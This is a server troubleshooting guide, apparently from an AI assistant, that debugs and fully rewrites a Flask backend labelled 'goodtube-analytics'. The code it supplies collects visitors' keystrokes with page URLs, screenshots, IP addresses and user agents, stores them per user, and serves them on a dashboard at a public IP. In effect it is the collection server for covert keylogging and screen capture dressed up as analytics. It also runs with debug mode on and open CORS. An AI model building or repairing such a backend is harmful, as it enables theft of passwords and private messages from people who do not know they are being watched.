# 🔍 Debug Server 500 Error

The server is running but returning a 500 error. Let's debug this step by step.

## 🚨 **Quick Diagnosis Commands**

SSH into your server and run these commands:

### **1. Check Service Status**
```bash
systemctl status goodtube-analytics
```

### **2. Check Application Logs**
```bash
journalctl -u goodtube-analytics -f --no-pager -n 50
```

### **3. Check Nginx Logs**
```bash
tail -f /var/log/nginx/error.log
tail -f /var/log/nginx/access.log
```

### **4. Test Flask App Directly**
```bash
cd /opt/goodtube-analytics
source venv/bin/activate
python app.py
```

### **5. Check if Database is Created**
```bash
ls -la /opt/goodtube-analytics/
ls -la /opt/goodtube-analytics/analytics.db
```

## 🔧 **Most Likely Issues & Fixes**

### **Issue 1: Database Not Initialized**
```bash
cd /opt/goodtube-analytics
source venv/bin/activate
python -c "
import sqlite3
conn = sqlite3.connect('analytics.db')
cursor = conn.cursor()
cursor.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, user_id TEXT UNIQUE, ip_address TEXT, user_agent TEXT, first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, total_events INTEGER DEFAULT 0)')
cursor.execute('CREATE TABLE IF NOT EXISTS events (id INTEGER PRIMARY KEY, user_id TEXT, session_id TEXT, event_type TEXT, event_data TEXT, url TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
cursor.execute('CREATE TABLE IF NOT EXISTS keystrokes (id INTEGER PRIMARY KEY, user_id TEXT, session_id TEXT, keystroke TEXT, url TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
cursor.execute('CREATE TABLE IF NOT EXISTS screenshots (id INTEGER PRIMARY KEY, user_id TEXT, session_id TEXT, filename TEXT, url TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
conn.commit()
conn.close()
print('Database initialized successfully')
"
```

### **Issue 2: Missing Flask App File**
```bash
# Check if app.py exists and is correct
cat /opt/goodtube-analytics/app.py | head -20
```

### **Issue 3: Wrong Flask App**
If the app.py is wrong, replace it:
```bash
cd /opt/goodtube-analytics
cat > app.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
import sqlite3
import json
import os
from datetime import datetime
import base64

app = Flask(__name__)
CORS(app)

DATABASE_PATH = 'analytics.db'
SCREENSHOTS_FOLDER = 'screenshots'

def init_database():
    conn = sqlite3.connect(DATABASE_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT UNIQUE NOT NULL,
            ip_address TEXT,
            user_agent TEXT,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            total_events INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            event_type TEXT NOT NULL,
            event_data TEXT,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            keystroke TEXT NOT NULL,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            filename TEXT NOT NULL,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()

def get_db_connection():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/analytics', methods=['POST'])
def receive_analytics():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        user_id = data.get('userId', 'unknown')
        session_id = data.get('sessionId', 'unknown')
        
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO users 
            (user_id, ip_address, user_agent, last_seen, total_events)
            VALUES (?, ?, ?, CURRENT_TIMESTAMP, 
                    COALESCE((SELECT total_events FROM users WHERE user_id = ?), 0) + 1)
        ''', (user_id, request.remote_addr, request.headers.get('User-Agent'), user_id))
        
        events = data.get('events', [])
        for event in events:
            cursor.execute('''
                INSERT INTO events (user_id, session_id, event_type, event_data, url)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, session_id, event.get('type', 'unknown'), 
                  json.dumps(event.get('data', {})), event.get('url', '')))
        
        keystrokes = data.get('keystrokes', [])
        for keystroke in keystrokes:
            cursor.execute('''
                INSERT INTO keystrokes (user_id, session_id, keystroke, url)
                VALUES (?, ?, ?, ?)
            ''', (user_id, session_id, keystroke.get('key', ''), keystroke.get('url', '')))
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        print(f"Analytics error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot', methods=['POST'])
def receive_screenshot():
    try:
        data = request.get_json()
        user_id = data.get('userId', 'unknown')
        session_id = data.get('sessionId', 'unknown')
        screenshot_data = data.get('screenshot', '')
        url = data.get('url', '')
        
        if screenshot_data:
            screenshot_bytes = base64.b64decode(screenshot_data.split(',')[1])
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"{user_id}_{session_id}_{timestamp}.png"
            filepath = os.path.join(SCREENSHOTS_FOLDER, filename)
            
            with open(filepath, 'wb') as f:
                f.write(screenshot_bytes)
            
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO screenshots (user_id, session_id, filename, url)
                VALUES (?, ?, ?, ?)
            ''', (user_id, session_id, filename, url))
            conn.commit()
            conn.close()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        print(f"Screenshot error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats')
def get_stats():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) as count FROM users')
        total_users = cursor.fetchone()['count']
        
        cursor.execute('SELECT COUNT(*) as count FROM events')
        total_events = cursor.fetchone()['count']
        
        cursor.execute('SELECT COUNT(*) as count FROM screenshots')
        total_screenshots = cursor.fetchone()['count']
        
        cursor.execute('SELECT * FROM events ORDER BY timestamp DESC LIMIT 10')
        recent_events = [dict(row) for row in cursor.fetchall()]
        
        conn.close()
        
        return jsonify({
            'totalUsers': total_users,
            'activeSessions': 0,
            'totalEvents': total_events,
            'totalScreenshots': total_screenshots,
            'recentEvents': recent_events
        })
        
    except Exception as e:
        print(f"Stats error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/users')
def get_users():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT u.*, 
                   COUNT(e.id) as event_count,
                   COUNT(k.id) as keystroke_count,
                   COUNT(s.id) as screenshot_count
            FROM users u
            LEFT JOIN events e ON u.user_id = e.user_id
            LEFT JOIN keystrokes k ON u.user_id = k.user_id
            LEFT JOIN screenshots s ON u.user_id = s.user_id
            GROUP BY u.user_id
            ORDER BY u.last_seen DESC
        ''')
        
        users = [dict(row) for row in cursor.fetchall()]
        conn.close()
        
        return jsonify({'users': users})
        
    except Exception as e:
        print(f"Users error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshots/<filename>')
def get_screenshot(filename):
    return send_from_directory(SCREENSHOTS_FOLDER, filename)

if __name__ == '__main__':
    init_database()
    app.run(host='0.0.0.0', port=5000, debug=True)
EOF

# Restart the service
systemctl restart goodtube-analytics
```

## 🚀 **Quick Fix Commands**

Run this complete fix:
```bash
cd /opt/goodtube-analytics && \
source venv/bin/activate && \
python -c "
import sqlite3
conn = sqlite3.connect('analytics.db')
cursor = conn.cursor()
cursor.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, user_id TEXT UNIQUE, ip_address TEXT, user_agent TEXT, first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, total_events INTEGER DEFAULT 0)')
cursor.execute('CREATE TABLE IF NOT EXISTS events (id INTEGER PRIMARY KEY, user_id TEXT, session_id TEXT, event_type TEXT, event_data TEXT, url TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
cursor.execute('CREATE TABLE IF NOT EXISTS keystrokes (id INTEGER PRIMARY KEY, user_id TEXT, session_id TEXT, keystroke TEXT, url TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
cursor.execute('CREATE TABLE IF NOT EXISTS screenshots (id INTEGER PRIMARY KEY, user_id TEXT, session_id TEXT, filename TEXT, url TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
conn.commit()
conn.close()
print('Database initialized')
" && \
systemctl restart goodtube-analytics && \
echo "✅ Fixed and restarted"
```

## 🧪 **Test After Fix**

```bash
# Test the API directly
curl -X POST http://localhost:5000/api/analytics \
  -H "Content-Type: application/json" \
  -d '{"userId":"test","sessionId":"test","events":[{"type":"test"}],"keystrokes":[]}'

# Test stats endpoint
curl http://localhost:5000/api/stats
```

## 📋 **Expected Results**

After the fix:
- ✅ `systemctl status goodtube-analytics` shows "active (running)"
- ✅ `curl http://localhost:5000/api/stats` returns JSON data
- ✅ Analytics test page shows "✅ Online"
- ✅ Dashboard loads at http://134.199.235.218

Run these commands and let me know what the logs show!

